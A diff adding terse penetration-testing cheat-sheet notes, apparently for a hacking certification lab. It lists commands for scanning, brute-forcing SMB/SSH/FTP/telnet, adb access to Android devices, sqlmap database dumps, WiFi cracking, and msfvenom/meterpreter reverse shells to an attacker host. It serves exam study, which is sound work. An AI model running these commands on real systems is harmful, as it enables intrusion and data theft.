@@ -112,3 +112,104 @@ aircrack-ng -a2 -b [Target BSSID] -w [password_Wordlist.txt] [WP2 PCAP file] (Fo
 Check RDP enabled after getting ip- nmap -p 3389 -iL ip.txt | grep open (ip.txt contains all the alive hosts from target subnet)
 Check MySQL service running- nmap -p 3306 -iL ip.txt | grep open        (ip.txt contains all the alive hosts from target subnet)
 ```
+```
+To scan entire subnet :
+nmap -sn ip/24
+FQDN :
+host + domain name
+nmap -sV -sC -v (ip)
+Service and version :
+nmap -sV -A ip/24
+SMB : Bookmarks = smb password cracking and enum4linux cheat sheet
+nmap -p 139,445 --script vuln ip
+hydra -L user.txt -P pass.txt ip smb (or) Check bookmark
+smbclient //(ip)/share
+smbclient -L ip
+get file and cat file and use bctextencoder if it is encoded
+Android :
+nmap -p 5555 ip
+adb connect ip:5555
+adb shell
+ls
+cd sdcard/
+ls
+pwd and exit
+adb pull
+apt install ent, ent file
+sha384sum file
+CVE :
+nmap -Pn --script vuln (ip)
+paste cve id and get the score [mostly: 10]
+Telnet : Bookmark= password cracking telnet
+nmap -vv ip (or) nmap -p 22,23,80,3389 ip
+telnet (ip) port(80)
+GET /HTTP/1.1
+hydra -L user.txt -P pass.txt ip ssh (or) bookmark [AM credentials]
+hydra -L user.txt -P pass.txt ip telnet [VM credentials]
+ssh username@ip and password
+telnet ip and password
+msfvenom -p cmd/unix/reverse_netcat lhost=ip(attacker's ip) lport=4444
+[paste this payload in target machine]
+nc -lnvp 4444 [type this in attacker's machine]
+ls
+find . -name file.txt
+cat /path/file.txt
+steganography :
+tools :
+openstego or stegonline
+upload the file and type password
+FTP:
+nmap -A -p 21 ip
+hydra -L user.txt -P pass.txt ftp://ip
+ftp ip and type: username and password
+Privilege escalation :
+nmap -sV ip
+ssh username@ip and password
+sudo -i or sudo su
+cd /
+find . -name file.txt
+cat /path/file.txt
+Malware analysis:
+DIE > upload file > file info
+PE extraction tools>open>upload>details
+DDOS:
+wireshark> statistics ipv4>source and destination
+filter[tcp.flags.syn==1 and tcp.flags.ack==0] [Most packets=ans]
+SQL:
+login>[Q]>console[document.cookie=copy the value]
+sqlmap -u "website" --cookie="value" --dbs
+sqlmap -u "website" --cookie="value" -D databse --tables
+sqlmap -u "website" --cookie="value" -D database --dump -T tablename
+DVWA:
+ZAP
+payload :
+msfconsole
+msfvenom -p php/meterpreter/reverse_tcp lhost=ip[from qns] lport=4444 -f
+raw > exploit.php
+use exploit/multi/handler
+set payload php/meterpreter/reverse_tcp
+set lhost ip [upload file]
+run [paste it in url]
+ls and get the file
+SQL:
+jsql
+[url with id] & attack
+sqlmap
+sqlmap -u "website" --cookie="value" --dbs
+DVWA:
+login> go to the path > copy the file and paste it in hashes.com (or)
+Crackstation.org
+IoT:
+wireshark>open file>filter[mqtt]
+publish msg>mqtt>header flags>msg type[len]
+WIFI:
+aircrack-ng -b [bssid=IEEE frame] -w [wifipass] [wificap]
+RAT: Ports[9871,6703]
+nmap -p- (ip)
+run client.exe [theef]
+enter ip,port and connect
+file explorer>file.txt
+VERACRYPT:
+veracrypt>select file>enter pass[decrypt=hashes.com]>open folder and see
+text
+```
